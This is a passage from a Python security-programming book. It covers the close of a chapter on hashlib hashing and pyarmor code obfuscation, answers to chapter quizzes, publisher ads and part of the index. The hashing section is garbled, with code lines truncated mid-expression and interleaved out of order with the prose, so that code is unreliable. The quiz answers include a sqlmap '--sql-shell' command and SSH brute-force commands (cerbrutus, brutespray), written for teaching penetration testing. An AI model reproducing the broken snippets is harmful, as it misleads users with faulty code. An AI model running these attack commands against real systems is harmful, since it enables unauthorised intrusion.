generation of the hash from the password. A salt is a random
number that you can use as an additional input to a one-way
function that hashes the input password. You can ﬁnd the following
code in the generate_check_password.py ﬁle inside the hashlib
folder:
$ python hash_password.py 
Password:password 
The hash password is: 
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1 b5e0
import uuid 
import hashlib 
def hash_password(password): 

In the preceding code, we are checking that both passwords entered
are the same. For this task, the hash_password() method performs
the inverse process of the generate_password() method.
The following is an example of the execution of the preceding script,
where we are generating and checking the password hash generated
by the SHA-512 algorithm:
    # uuid is used to generate a random number 
    salt = uuid.uuid4().hex 
    return hashlib.sha256(salt.encode() + password.e
def check_password(hashed_password, user_password): 
    password, salt = hashed_password.split(':') 
    return password == hashlib.sha256(salt.encode() 
new_pass = input('Enter your password: ') 
hashed_password = hash_password(new_pass) 
print('The password hash: ' + hashed_password) 
old_pass = input('Enter again the password for check
if check_password(hashed_password, old_pass): 
    print("Password is correct") 
else: 
    print("Passwords doesn't match") 
$ python generate_check_password.py 
Enter your password: password 
The password hash: 0cfa3fd33cea8a0edae7f6a4d29d21341
Enter again the password for checking: password 
Password is correct 

We will continue reviewing the other hashlib methods. The new()
method returns a new object of the hash class implementing the
speciﬁed (hash) function and takes as the ﬁrst parameter a string
with the name of the hash algorithm (md5, sha256, or sha512) and
a second parameter that represents a byte string with the data:
>>> import hashlib 
>>> hash = hashlib.new("hash_type", "string") 
The following is an example of hashing a password with sha1 and
printing the result:
The digest() method processes the data from a hash object and
converts it into a byte-encrypted object, made up of bytes in the
range of 0 to 255. The hexdigest() method has the same function
as digest(), but its output is a double-length string, made up of
hexadecimal characters.
This module also provides the update() method, which updates
the hash object by adding a new string. The following instructions
are equivalent to the previous one:
>>> import hashlib 
>>> hash = hashlib.new("sha1", "password".encode()) 
>>> print(hash.digest(), hash.hexdigest()) 
b'[\xaaa\xe4\xc9\xb9??\x06\x82%\x0bl\xf83\x1b~\xe6\x

The use of the update() method is very common when you want to
encrypt a lot of data, since you can apply the encryption in parts.
The following example tries to compute the hash of a ﬁle’s content.
You can ﬁnd the following code in the get_hash_from_image.py
ﬁle inside the hashlib folder:
import hashlib 
md5 = hashlib.new("md5") 
sha256 = hashlib.new("sha256") 
with open("python-logo.png", "rb") as some_file: 
    md5.update(some_file.read()) 
    print("MD5:",md5.hexdigest()) 
    print("SHA256:",sha256.hexdigest()) 
In the execution of the previous script, we can see in the output MD5
and SHA256 hashes using the content of the ﬁle python-logo.png.
>>> hash = hashlib.sha1() 
>>> hash.update(b"password") 
>>> print(hash.digest(), hash.hexdigest()) 
b'[\xaaa\xe4\xc9\xb9??\x06\x82%\x0bl\xf83\x1b~\xe6\x
$ python get_hash_from_image.py 
MD5: 7cbb8b7f3ec73ce6716fedaa4d63f6ce 
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b

Finally, this module contains a collection with the name
hashlib.algorithms_guaranteed, which provides the names of
the algorithms supported by the module that are present in all
language distributions. So, with the following code, we can test the
eﬃciency of each of the functions:
Now that we have had an introduction to the hashlib module, we’ll
continue analyzing the integrity of a ﬁle using this module.
Checking the integrity of a file
>>> for algorithm in hashlib.algorithms_guaranteed: 
...     print(algorithm) 
...  
blake2s 
blake2b 
sha512 
shake_128 
md5 
sha3_224 
sha256 
sha1 
sha384 
sha224 
shake_256 
sha3_512 
sha3_384 
sha3_256 

Another possibility oﬀered by the hashlib module is to be able to
check the integrity of a ﬁle. Hashes can be used to verify whether
two ﬁles are identical and that the contents of a ﬁle have not been
corrupted or changed.
The following script allows you to obtain the hash of any ﬁle with
available algorithms such as MD5, SHA1, and SHA256. You can ﬁnd
the following code in the checking_file_integrity.py ﬁle inside
the hashlib folder:
import hashlib 
file_name = input("Enter file name:") 
file = open(file_name, 'r') 
data = file.read().encode('utf-8') 
for algorithm in hashlib.algorithms_available: 
    hash = hashlib.new(algorithm) 
    hash.update(data) 
    try: 
        hexdigest = hash.hexdigest() 
    except TypeError: 
        hexdigest = hash.hexdigest(128) 
    print("%s: %s" % (algorithm, hexdigest)) 
The preceding script returns the hash of the ﬁle entered by the user,
applying the diﬀerent algorithms that hashlib provides. The
following can be the execution of the preceding script, where we are
checking the hash of the ﬁle with the algorithms available in
hashlib:

In this section, we have reviewed the main modules for tasks related
to the generation of passwords in a secure way, as well as the
veriﬁcation of the integrity of a ﬁle with the diﬀerent hash
algorithms.
Python tools for code obfuscation
In this section, we are going to review some tools Python provides
for code obfuscation.
Code obfuscation is a technique for hiding the original source code
of a program or application and making it diﬃcult to read. This type
of technique is often used to write malicious code in such a way that
an antivirus system cannot detect it. Among the main tools we have
$ python checking_file_integrity.py 
Enter file namechecking_file_integrity.py 
blake2b: 9dbf0c181f542a52194266c10f1e1ffce6e2c7060a9
md4: e006d9971b840ecd3ef7e3a6938da35b 
sha256: e0cab8d2f0fee4c40db05c6b165eaa6ea79550d1f5d6
whirlpool: 19e2dd7aa3becb4128abb9adb883c0c129b1d9b17
sha1: 4e4186b1bfc4616ac7d511a5752a21cbd69f0844 
sha3_224: a651392a9206cc8ba8573832a846a880cd9d493872
sha3_384: a02b7c1e08d629250374375055dca7c644b8c2327c
sha3_256: 4d168d5bf6d0df4b6f50bfff413760f1837b5a4434
blake2s: 35611f928b68c5a54c0e8bc86a3e8b1b1f6c8ad0a91
sha512_256: 5c4ebfaac78c36dc7f80858fd373653e1011fa83
... 

to obfuscate Python code, we can highlight pyarmor. Generally
speaking, obfuscation makes code diﬃcult to understand.
Code obfuscation with pyarmor
Pyarmor (https://github.com/dashingsoft/pyarmor) is one of
the most used tools for code obfuscation in Python. You can install it
using the source code from the previous GitHub repository or using
the following command:
$ pip install pyarmor 
Pyarmor provides the following options for execution:
The most commonly used pyarmor commands are:
$ pyarmor -h 
usage: pyarmor [-h] [-v] [-q] [-d] [--home HOME] [--
PyArmor is a command line tool used to obfuscate pyt
bind obfuscated scripts to fixed machine or expire o
optional arguments: 
  -h, --help     show this help message and exit 
  -v, --version  show program's version number and e
  -q, --silent   Suppress all normal output 
  -d, --debug    Print exception traceback and debug
  --home HOME    Change pyarmor home path 
  --boot BOOT    Change boot platform 

To simplify, this is the code to obfuscate, and you can ﬁnd it in the
code_obfuscate.py ﬁle inside the obfuscation folder:
def main(): 
    print("Hello World!") 
if __name__ = = "__main__": 
    main() 
We can obfuscate the above code with the following command:
    obfuscate (o) 
                 Obfuscate python scripts 
    licenses (l) 
                 Generate new licenses for obfuscate
    pack (p)     Pack obfuscated scripts to one bund
    init (i)     Create a project to manage obfuscat
    config (c)   Update project settings 
    build (b)    Obfuscate all the scripts in the pr
    info         Show project information 
    check        Check consistency of project 
    hdinfo       Show all available hardware informa
    benchmark    Run benchmark test in current machi
    register     Make registration keyfile work 
    download     Download platform-dependent dynamic
    runtime      Generate runtime package separately
    help         Display online documentation 
See "pyarmor <command> -h" for more information on a
More usage refer to https://pyarmor.readrthedocs.io 

By executing the obfuscate option on the above code, the process
generates a new folder called dist containing the following
obfuscated code.
If you try to execute the script with the code obfuscated, you can see
the expected output.
$ python dist/code_ofuscate.py 
Hello World! 
Another possibility oﬀered by this tool is that we can run it through
a web application that we can deploy on our local machine. To do
$ pyarmor obfuscate code_ofuscate.py  
INFO     PyArmor Trial Version 7.6.1 
INFO     Python 3.8.8 
INFO     Target platforms: Native 
INFO     Source path is "/home/linux/Descargas/chapt
INFO     Entry scripts are ['code_ofuscate.py'] 
INFO     Use cached capsule /home/linux/.pyarmor/.py
INFO     Search scripts mode: Normal 
INFO     Save obfuscated scripts to "dist" 
from pytransform import pyarmor_runtime 
pyarmor_runtime() 
__pyarmor__(__name__, __file__, b'\x50\x59\x41\x52\x

this, we can download the source code from the following
repository: https://github.com/dashingsoft/pyarmor-webui.
We can install it with the following command:
$ pip install pyarmor-webui 
Once installed, we can execute the web server with the following
command:
$ pyarmor-webui 
INFO     Data path: /home/linux/.pyarmor 
INFO     Serving HTTP on 127.0.0.1 port 9096 ... 
Once the server is up, we can access the following URL from our
browser: http://localhost:9096. In the following screenshot, we
can see the home page for the web application:

Figure 14.1: PyArmor home page
Upon selecting the Obfuscate Script Wizard option, the interface
oﬀers the possibility to select the path where the source code is
located and the script to obfuscate.
Figure 14.2: The Obfuscate Script Wizard path selector
It is important to keep in mind that code obfuscation has its
disadvantages as well; for example, it can result in complications in
error identiﬁcation when a defect arises in execution. This happens
because when obfuscation is applied, all methods are modiﬁed and
the registries are also aﬀected, making it more diﬃcult to use the
laĴer to identify errors.

In general, when it comes to code security, obfuscation can be an
important part of what technology companies can apply to protect
their code. But it is not the only method that can be used. At this
point, it is important to remember that security coming exclusively
from obscurity is not advisable and it would be a mistake to think
that software code is secure just because it has been obfuscated.
These kinds of techniques should be complemented by applying best
practices, deﬁned processes, and speciﬁc security implementations.
Summary
One of the objectives of this chapter was to learn about the
pycryptodome and cryptography modules, which allow us to
encrypt and decrypt information with the AES and DES algorithms.
We also analyzed some tools that allow us to apply code obfuscation
in Python.
Everything learned throughout this chapter can be useful for
developers in terms of having alternatives when we need to use a
module that makes it easier for us to apply cryptographic and
steganographic techniques to our applications.
To conclude this book, I would like to emphasize that you should
learn more about the topics you consider most important. Each
chapter covered the fundamental ideas. With this starting point, you
can use the Further reading section to ﬁnd resources for more
information.
Questions

As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Which algorithm type uses two diﬀerent keys, one for
encryption and the other for decryption?
2. Which package from the pycryptodome module can we use for
asymmetric encryption?
3. Which package from the cryptography module can we use for
symmetric encryption?
4. Which class of cryptography module provides the cipher
package with symmetric encryption?
5. Which algorithm is used to derive a cryptographic key from a
password?
Further reading
You can use the following links to ﬁnd more information about the
mentioned tools, as well as links to the oﬃcial Python
documentation for some of the modules referenced:
Cryptography documentation:
https://cryptography.io/en/latest.
PyCryptodome documentation:
https://pycryptodome.readthedocs.io/en/latest.
bcrypt: https://pypi.org/project/bcrypt. This is a library
that allows users to generate password hashes.
secrets:
https://docs.python.org/3/library/secrets.html#modu

le-secrets. This is used to generate cryptographically strong
random numbers that are suitable for managing data, such as
passwords and security tokens.
The hashlib module:
https://docs.python.org/3.10/library/hashlib.html.
hash-identiﬁer: https://github.com/blackploit/hash-
identifier. This is a Python tool for identifying the diﬀerent
types of hashes used to encrypt data.
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

15

Assessments – Answers to the
End-of-Chapter Questions
In the following pages, we will provide answers to the practice
questions from the end of each of the chapters in this book and
provide the correct answers.

Chapter 1 – Working with Python
Scripting
1. The Python dictionary data structure provides a hash table that
can store any number of Python objects. The dictionary consists
of pairs of items containing a key and a value.
2. list.append(value),
list.extend(values),list.insert(location, value)
3. Using the context manager approach, the with statement
automatically closes the ﬁle even if an exception is raised. Using
this approach, we have the advantage that the ﬁle is closed
automatically, and we don’t need to call the close() method.
4. BaseException
5. virtualenv and venv

Chapter 2 – System Programming
Packages
1. The operating system (os) module.
2. The subprocess.run() method blocks the main process until
the command executed in the child process ﬁnishes, while with
subprocess.Popen(), you can continue to execute parent
process tasks in parallel, calling subprocess.communicate to
pass or receive data from the threads whenever desired.
3. The concurrent.futures module provides the
ThreadPoolExecutor class, which provides an interface to
execute tasks asynchronously. This class will allow us to recycle
existing threads so that we can assign new tasks to them.
4. We could use the is_alive() method to determine if the
thread is still running or has already ﬁnished. In addition, it
oﬀers us the ability to work with multiple threads where each
one runs independently without aﬀecting the behavior of the
other.
5. threading.get_ident()

Chapter 3 – Socket Programming
1. socket.accept() is used to accept the connection from the
client. This method returns two values: client_socket and
client_address, where client_socket is a new socket object
used to send and receive data over the connection.
2. These are the methods we can use to send and receive data:
socket.sendto(data, address) is used to send data to a
given address.
socket.send(bytes) is used to send bytes of data to the
speciﬁed target.
socket.sendto(data, address) is used to send data to a
given address.
socket.recv(buflen) is used to receive data from the
socket. The method argument indicates the maximum
amount of data it can receive.
socket.recvfrom(buflen) is used to receive data and the
sender’s address.
3. The sock.connect_ex((ip_address,port)) method is used
to check the state of a speciﬁc port in the IP address we are
analyzing.
4. The main diﬀerence between TCP and UDP is that UDP is not
connection oriented. This means that there is no guarantee that
our packets will reach their destinations, and there is no error
notiﬁcation if a delivery fails. Another important diﬀerence
between TCP and UDP is that TCP is more reliable than UDP

because it checks for errors and ensures data packets are
delivered to the communicating application in the correct order.
5. We can implement as a base an HTTP server that accepts GET
requests using the HTTPServer and BaseHTTPRequestHandler
classes of the http.server module. For example, from
http.server import HTTPServer,
BaseHTTPRequestHandler.

Chapter 4 – HTTP Programming and
Web Authentication
1. response = requests.post(url, data=data) and
response = urllib.request.urlopen(url,
data_dictionary)
2. Use the following methods:
response.request.headers.items() and
response.headers.items().
3. The OAuth protocol has the following roles:
Resource owner: The resource owner is the user who
authorizes a given application to access their account and
be able to execute some tasks.
Client: The client would be the application that wants to
access that user account.
Resource server: The resource server is the server that
stores user accounts.
Authorization server: The authorization server is
responsible for handling authorization requests.
4. The HTTP digest authentication mechanism uses MD5 to
encrypt the user, key, and realm hashes.
5. The User-Agent header.

Chapter 5 – Analyzing Network
Traffic and Packet Sniffing
1. scapy> pkts = sniff (iface = "eth0", count = n),
where n is the number of packets.
2. scapy> sr1(IP(dst=host)/TCP(dport=port),
verbose=True)
3. IP/UDP/sr1
4. send() sends layer-3 packets and sendp() sends layer-2
packets.
5. The prn parameter will be present in many other functions and,
as can be seen in the documentation, refers to a function as an
input parameter. Here’s an example: >>>
packet=sniff(filter="tcp", iface="eth0",
prn=lambdax:x.summary()).

Chapter 6 – Gathering Information
from Servers with OSINT Tools
1. In the Settings section, integrations with third-party
platforms are conﬁgured, among which are tools such as
Shodan, Hunter.io, Haveibeenpwned, ipinfo.io, phishtank, and
Robtex, among many others.
2. A web fuzzer is a type of tool that allows you to test which
routes are active and which are not on a website. The way it
does this is by testing random URLs and sending them signals
to see if they work.
3. The dnspython module provides the dns.resolver()
method, which allows you to ﬁnd multiple records from a
domain name. The function takes the domain name and the
record type as parameters.response NS =
dns.resolver.query('domain_name','NS').
4. FuzzDB is a project where we ﬁnd a set of folders that contain
paĴerns of known aĴacks that have been collected in multiple
pentesting tests, mainly in web environments. The FuzzDB
categories are separated into diﬀerent directories that contain
predictable resource-location paĴerns, that is, paĴerns to detect
vulnerabilities with malicious payloads or vulnerable routes.
5. We can use the requests module to make a request over a
domain using the diﬀerent aĴack strings we can ﬁnd in the
MSSQL.txt ﬁle.

Chapter 7 – Interacting with FTP,
SFTP, and SSH Servers
1. with open(DOWNLOAD_FILE_NAME, 'wb') as
file_handler:
ftp_cmd = 'RETR %s' %DOWNLOAD_FILE_NAME
ftp_client.retrbinary(ftp_cmd,file_handler.write)
2. ssh = paramiko.SSHClient()
ssh.connect(host, username='username',
password='password')
3. ssh_session = client.get_transport().open_session()
4. To run any command on the target host, we need to invoke the
exec_command() method by passing the command as its
argument. We could use the following instructions:
ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.
AutoAddPolicy())
ssh_client.load_system_host_keys()
ssh_client.connect(hostname, port, username,
password)
stdin, stdout, stderr =
ssh_client.exec_command(command)
5. ssh_client.set_missing_host_key_policy(paramiko.Aut
oAddPolicy())

Chapter 8 – Working with Nmap
Scanner
1. portScanner = nmap.PortScanner()
2. portScannerAsync = nmap.PortScannerAsync()
3. self.portScannerAsync.scan(hostname, arguments="-A
-sV -p"+port ,callback=callbackResult)
4. self.portScanner.scan(hostname, port)
5. When performing the scan, we can indicate an additional
callback function parameter where we can deﬁne the function
that would be executed at the end of the scan.

Chapter 9 – Interacting with
Vulnerability Scanners
1. connection = UnixSocketConnection(path=path)
2. from gvm.protocols.gmp import Gmp
gmp.authenticate('username', 'password')
3. scanID = zap.spider.scan(target)
4. with open("report.html", "w") as
report_file:report_file.write(zap.core.htmlreport()
)
5. scanID = zap.ascan.scan(target)

Chapter 10 – Interacting with
Server Vulnerabilities in Web
Applications
1. Cross-Site Scripting (XSS) allows aĴackers to execute scripts in
the victim’s browser, allowing them to hijack user sessions or
redirect the user to a malicious site.
2. SQL injection is a technique that is used to steal data by taking
advantage of a non-validated input vulnerability. Basically, it is
a code injection technique where an aĴacker executes malicious
SQL queries that control a web application’s database.
3. By executing the following command, we can get an interactive
shell to interact with the database with the query SQL language:
$ sqlmap -u
'http://testphp.vulnweb.com/listproducts.php?cat=1'
--sql-shell.
4. http-sql-injection
5. Fuzzing techniques.

Chapter 11 – Obtain Information
from Vulnerabilities Database
1. Exploits are pieces of software or scripts that take advantage of
an error, failure, or weakness in order to cause unwanted
behavior in a system or application, allowing a malicious user to
force changes in its execution ﬂow with the possibility of being
controlled at will.
2. CVSS codes provide a set of standard criteria that makes it
possible to determine which vulnerabilities are more likely to be
successfully exploited. The CVSS code introduces a system for
scoring vulnerabilities, considering a set of standardized and
easy-to-measure criteria.
3. Vulnerabilities are uniquely identiﬁed by the Common
Vulnerabilities and Exposures (CVE) code format, which was
created by the MITRE Corporation. This code allows a user to
understand a vulnerability in a program or system in a more
objective way.
4. CVE Details (https://www.cvedetails.com) is a service
where you can ﬁnd data on common vulnerabilities in a
convenient, graphical interface. This website organizes its
categories by vendor, product, date of registration, and
vulnerability type.
5. import vulners
vulners_api=vulners.Vulners(api_key="<API_KEY>")

references=vulners_api.get_bulletin_references("CVE
_identifier")

Chapter 12 – Extracting
Geolocation and Metadata from
Documents, Images, and Browsers
1. geolite2.lookup(ip_address)
2. The PyPDF2 module oﬀers the ability to extract document
information, as well as encrypt and decrypt documents. To
extract metadata, we can use the PdfFileReader class and the
getDocumentInfo() method, which return a dictionary with
the document data.
3. PIL.ExifTags is used to obtain the information from the EXIF
tags of an image, and using the _getexif() method of the
image object, we can extract the tags stored in the image.
4. places.sqlite database and moz_historyvisits table
5. History database and downloads table.

Chapter 13 – Python Tools for
Brute-Force Attacks
1. $ python pydictor.py -plug scratch <domain> -o
output.txt
2. $ psudohash.py -w "word_list" --common-paddings-
after
3. BruteSpray is a script wriĴen in Python that has the capacity
to search for hosts and open ports with the Nmap port scanner.
$ python brutespray.py --file nmap_output.xml -t 5
-T 2
4. $ python cerbrutus.py <domain> SSH -U "user" -P
wordlists/fasttrack.txt -t 10
5. Pyminizip
compress("/srcfile/path.txt", "file_path_prefix",
"/distfile/path.zip", "password",
int(compress_level))

Chapter 14 – Cryptography and
Code Obfuscation
1. Public key algorithms use two diﬀerent keys: one for encryption
and the other for decryption. Users of this technology publish
their public keys while keeping their private keys secret. This
enables anyone to send them a message encrypted with their
public key, which only they, as the holder of the private key, can
decrypt.
2. from Crypto.PublicKey import RSA
3. The fernet package is an implementation of symmetric
encryption and guarantees that an encrypted message cannot be
manipulated or read without the key. Here’s an example of its
use: from cryptography.fernet import Fernet.
4. cryptography.hazmat.primitives.ciphers.Cipher
5. Password-Based Key Derivation Function 2 (PBKDF2). For the
cryptography module, we can use the package from
cryptography.hazmat.primitives.kdf.pbkdf2 import
PBKDF2HMAC.
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet


packt.com
Subscribe to our online digital library for full access to over 7,000
books and videos, as well as industry leading tools to help you plan
your personal development and advance your career. For more
information, please visit our website.
Why subscribe?
Spend less time learning and more time coding with practical
eBooks and Videos from over 4,000 industry professionals
Improve your learning with Skill Plans built especially for you
Get a free eBook or video every month
Fully searchable for easy access to vital information
Copy and paste, print, and bookmark content
At www.packt.com, you can also read a collection of free technical
articles, sign up for a range of free newsleĴers, and receive exclusive
discounts and oﬀers on Packt books and eBooks.

Other Books You May Enjoy
If you enjoyed this book, you may be interested in these other books
by Packt:
Mastering Python Networking, Fourth Edition
Eric Chou
ISBN: 9781803234618
Use Python to interact with network devices
Understand Docker as a tool that you can use for the
development and deployment
Use Python and various other tools to obtain information from
the network
Learn how to use ELK for network data analysis

Utilize Flask and construct high-level API to interact with in-
house applications
Discover the new AsyncIO feature and its concepts in Python 3
Explore test-driven development concepts and use PyTest to
drive code test coverage
Understand how GitLab can be used with DevOps practices in
networking

Mastering Palo Alto Networks, Second edition
Tom Piens
ISBN: 9781803241418
Explore your way around the web interface and command line
Discover the core technologies and see how to maximize your
potential in your network
Identify best practices and important considerations when
conﬁguring a security policy
Connect to a freshly booted appliance or VM via a web interface
or command-line interface
Get your ﬁrewall up and running with a rudimentary but rigid
conﬁguration

Gain insight into encrypted sessions by seĴing up SSL
decryption
Troubleshoot common issues, and deep-dive into ﬂow analytics
Conﬁgure the GlobalProtect VPN for remote workers as well as
site-to-site VPN

Packt is searching for authors like
you
If you’re interested in becoming an author for Packt, please visit
authors.packtpub.com and apply today. We have worked with
thousands of developers and tech professionals, just like you, to help
them share their insight with the global tech community. You can
make a general application, apply for a speciﬁc hot topic that we are
recruiting an author for, or submit your own idea.
Share your thoughts
Now you’ve ﬁnished Python for Security and Networking, Third
Edition, we’d love to hear your thoughts! Please click here to go
straight to the Amazon review page for this book and share
your feedback.
Your review is important to us and the tech community and will
help us make sure we’re delivering excellent quality content.

Index
A
AAAA record 227
acunetix service 366
Address Resolution Protocol (ARP) 191
Advanced Encryption Standard (AES) 503
for file encryption 505-508
using 503-505
Aiodnsbrute
reference link 476
anonymous FTP scanner
building, with Python 255-258
Apache Tomcat 378
ARP spoofing attack
detecting, with scapy 198, 199
asymmetric ciphers 500
asymmetric cryptography 498
asynchronous scanning
implementing 300-304
with python-nmap 294
Asyncio module

reference link 476
authentication mechanisms, HTTP protocol
basic authentication 138
bearer authentication 138
digest authentication 138
AutoAddPolicy
using 263, 265
B
BinaryEdge search engine 217, 218
URL 217
Blackbird 215, 216
URL 215
brute-force attacks
dictionary builders 468
executing, for password-zip files 491-494
executing, for web applications 482
executing, for zip files 487
executing, with BruteSpray 479, 480
executing, with Cerbrutus 481, 482
tools, in Python 476
brute-force dictionary
generation, with pydictor 468-474
BruteSpray
brute-force attacks, executing with 479, 480

builtwith
URL 448
C
Censys 211
Cerbrutus
brute-force attacks, executing with 481, 482
Certification Authority (CA) 258
Chrome forensics
with Hindsight 460-463
with Python 456-459
cipher-block chaining (CBC) 503
ciphers package
for symmetric encryption 517-519
CMSmap 375
reference link 375
using 375, 376
CNAME Record 227
code obfuscation 526
with pyarmor 527-530
commands
executing, with subprocess module 53-59
running, with paramiko module 266-268
Common Vulnerabilities and Exposures (CVE) 337, 405
reference link 408

Common Vulnerability Scoring System (CVSS) 324, 358
Content Management System (CMS) 374
context manager
used, for executing ThreadPoolExecutor 71, 72, 73
Cross-Site Request Forgery (CSRF) 350
Cross-Site Scripting (XSS) vulnerabilities 368
reflected XSS 365
testing 368-374
XSS DOM 365
XSS Persistent or Stored 365
crt.sh 212
Crypto 101
URL 497
Crypto.Cipher package 500
asymmetric ciphers 500
hybrid ciphers 500
symmetric ciphers 500
cryptography 498
cryptography algorithms
asymmetric cryptography 498
hash functions 498
keyed hash functions 498
symmetric cryptography 498
cryptography module 512, 513

advantage 513
reference link 260, 512
CTR 517
CVE Details
URL 413
D
data structures 4
Debian Linux
SSH server, executing on 258, 259
dependencies
managing 36
managing, in Python project 36
DES algorithm 501
data, decrypting and encrypting with 501, 502
development environments, for Python scripting 39
PyCharm 40, 41
PyCharm, debugging with 41, 42
Python IDLE, debugging with 39, 40
dictionary attack 253
DnsDumpster 213
dnspython module 227
DNSPython module 227-232
DNSRecon 232-236
DNS servers

DNS protocol 226
DNSPython module 227-232
DNSRecon 232-236
information, obtaining with DNSPython and DNSRecon 226
Docker compose
reference link 482
Domain Name Server (DNS) 226
dorks 216, 218
Dorks hunter 220, 221
URL 220
DoS (Denial of Service) 198
dpkt 1.9.8
installation link 432
E
electronic Code-Book (ECB) 503
exceptions
handling, with urllib.request 124
managing, with requests 137
exceptions management 23-28
EXchangeable Image File Format (EXIF) 438, 439
data obtaining, from image 439-443
ExifRead
reference link 442
EXIF tags 438

exploit 407
Extensible Metadata Platform (XMP) 445
F
false ARP attacks
detecting, with scapy 199-201
fernet package 513
for symmetric encryption 513-516
reference link 513
file encryption
with AES 505-508
file integrity
checking, with hashlib module 525, 526
filesystem
files and directories, working with 50, 51
working with, in Python 49
ZIP file, reading with Python 52, 53
File Transfer Protocol (FTP) 248, 284
used, for transferring files 249-25
Firefox 452
Firefox forensics
with Python 452-456
firefox-profile
reference link 455
fitz 447

ftplib 248
functions 252, 253
reference link 248
using, to brute-force FTP user credentials 253-255
FTP protocol 248
disadvantage 248
FTP servers
connecting to 248
function 13
Fuxploider 401
reference link 401
vulnerabilities, detecting with 402
FuzzDB project
predictable login pages, identifying with 240, 241
SQL injection, discovering with 241-243
using 238, 240
Wfuzz 244
fuzzing 236
used, for obtaining vulnerable addresses in servers 236
G
Galois/Counter Mode (GCM) 503
GeoIP2 web services
reference link 430
geolocation information

extracting 428, 429
extracting, with Python modules 430-437
Global Interpreter Lock (GIL) 66
Google Chrome 456
Google Dorks 207, 219
information, obtaining with 218
Google Hacking 207
Google Hacking Database (GHDB) 208
URL 219
Graphical User Interface (GUI) 327
H
hash functions 498
hashlib module
integrity of file, checking 525, 526
keys, generating securely 521-525
Hindsight
Chrome forensics with 460-463
HTTP basic authentication
using, with requests module 138, 139
HTTP client
building, with requests 125-128
building, with urllib.request 116
HTTP digest authentication
using, with requests module 139-142

HTTP protocol 116, 117
request 116
response 116
urllib module 117-119
HTTP server
implementing, in Python 102, 103
testing 103, 104
hybrid ciphers 500
Hypertext Transfer Protocol (HTTP) 284
I
image
EXIF data, obtaining from 439-443
metadata, extracting from 438
initialization vector (IV) attributes 499
Integrated Development Environment (IDE) 39
Internet Service Provider (ISP) 84
IP Geolocation API
reference link 428
J
Java Server Pages(JSP) 378
JSON Web Signature (JWS) 149
JSON Web Token (JWT)
implementing, in Python 148

working 148-150
K
Kali Linux
URL 389
Katana 220
URL 220
key derivation functions
reference link 516
keyed hash functions 498
keys
generating, with hashlib module 521-525
generating, with secrets module 520, 521
L
lists 4
local attack 406
M
Maltego 208, 209
URL 208
MaxMind
URL 430
MaxMindDB reader extension
reference link 430

member functions 14
Message-Authentication Codes (MACs) 498
metadata
extracting, from images 438
extracting, from PDF documents 443
extracting, from web browsers 452
extracting, with PyMuPDF 447, 448
extracting, with PyPDF2 443-447
MITM (Man In The Middle) 198
module 28-31
importing, in Python 29
information, obtaining from 30
multithreading
in Python 68
MX Records 227
N
National Vulnerability Database calculator
reference link 359
National Vulnerability Database (NVD) 405, 412, 413
reference link 408
Netcat
URL 94
network forensics
with scapy 196, 197

network requests
socket package 78
network sockets
in Python 78, 79
Network Vulnerability Tests (NVTs) 336, 337
Nmap
ports 287
port scanning 284
scanning types 284-287
used, for extracting information 290-293
nmap -h option command
reference link 287
Nmap port scanner
SQL injection vulnerabilities, scanning with 396-398
Tomcat server vulnerabilities, scanning with 382-384
Nmap, scan techniques
sA (TCP ACK Scan) 286
sF (TCP FIN Scan) 286
sF (TCP XMAS Scan) 286
sN (TCP NULL Scan) 286
sT (TCP Connect Scan) 285
sT (TCP Stealth Scan) 285
sU (UDP Scan) 286
Nmap Scripting Engine (NSE) 287, 305, 396
Nmap scripts

executing, to discover services 305-308
executing, to discover vulnerabilities 308-311
used, for discovering services 305
used, for discovering vulnerabilities 305
Nmap-vulners scripts
used, for detecting vulnerabilities 312, 313
Nmap-vulscan scripts
used, for detecting vulnerabilities 313-315
nslookup tool 226
NS Record 227
O
OAuth 2.0
URL 142
OAuth clients, Python
implementing, with requests-oauthlib module 142
OAuth roles 143
authorization server 143
client 143
Resource Owner 143
resource server 143
OAuth workflow 143, 144
authorization code 143
client credentials 143
implicit authorization 143

resource owner password credentials 143
online services
through, port scanning 315
open redirect vulnerability 398
detecting 398-401
Open Source Intelligence (OSINT) 206
applications 206
BinaryEdge search engine 217, 218
Blackbird 215, 216
Censys 211
crt.sh 212
DnsDumpster 213
Google Dorks 207
Google Hacking Database 208
Maltego 208, 209
OSINT framework 214
phases 207
Photon 210
Shodan search engine 216
The Harvester 211
WaybackMachine 213
OpenVAS vulnerability scanner
client service 326
installing 325, 326

manager service 326
reports, analyzing 333-336
scanning service 325
target, creating 330, 331
task, creating 331-333
used, for scanning target 329, 330
vulnerabilities databases 336-338
web interface 327, 328
web interface, menu options 328
Open Vulnerability Assessment System (OpenVAS) 324
accessing, with Python 338-342
reference link 324
operating system (OS)
interacting with, in Python 46-49
methods 47
OptionParser
parameters, managing with 35
OSINT framework 214
OWASP Top 10 project
reference link 365
OWASP ZAP
active scanner 344
interacting, with Python 348-353
modules 323

passive scanner 344
using 344-347
using, as automated security testing tool 342, 344
P
package 31
packets
capturing, with pcapy-ng 154
headers, running from 155, 157
injecting, with pcapy-ng 154
injecting, with scapy 158
packet-sniffing
with scapy 187-196
PacketStorm class 421
paramiko 259
advantages 260
reference link 481
used, for connecting SSH servers 258
used, for establishing an SSH connection 260-263
used, for implementing SSH Server 271-275
used, for running commands 266-268
using, to brute-force SSH user credentials 268, 269
Password-Based Key Derivation Function 2 (PBKDF2) 516
encrypting with 516, 517
pcap files

DHCP requests, reading 183-185
reading, with scapy 181-183
writing 186
PCAP (Packet CAPture) 181
pcapy-ng 154
headers, reading from packets 155, 157
packets, capturing with 154, 155
packets, injecting with 154
pcap files, reading with 157, 158
PDF documents
metadata, extracting from 443
Photon
URL 210
Pompem
reference link 420
used, for searching vulnerabilities 419-423
Popen constructor
reference link 59
port scanner
advanced port scanner 90-93
implementing 88, 90
port scanning
via online services 315
with Nmap 284

with python-nmap 287-290
private key 258
proxy
managing, with requests 136
psudohash 474-476
reference link 474
public key 258
pyarmor 527
for code obfuscation 527-530
reference link 527
pybinaryedge module
URL 217
PyCharm 40
debugging with 41, 42
URL 39
pycryptodome 499, 500
characteristics 499
URL 499
used, for generating RSA signatures 508-512
pydictor
brute-force dictionary, generating with 468-474
reference link 468
